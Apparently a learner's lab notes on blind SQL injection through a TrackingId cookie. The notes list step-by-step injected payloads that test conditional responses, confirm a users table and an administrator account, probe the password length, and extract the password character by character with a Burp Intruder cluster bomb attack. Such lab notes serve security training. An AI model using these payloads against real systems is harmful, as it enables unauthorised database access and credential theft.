TrackingId=xyz' AND '1'='1
-verify that the welcome back message appears in the response

TrackingId=xyz' AND '1'='2
-verify that the welcome back message does not appear in the response

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
-verify that the condition is true,comfirming that there is a table called users

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-verify that the condition is true,confirming that there is user called administrator

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-this condition should be true,confirming that the password is greater than 1 character in length

=>use intruder to brute force length password if response is true with welcome back then will stop

TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$
-use intruder to use this attack cluster bomb with multiple payload sets

**cluster bomb**
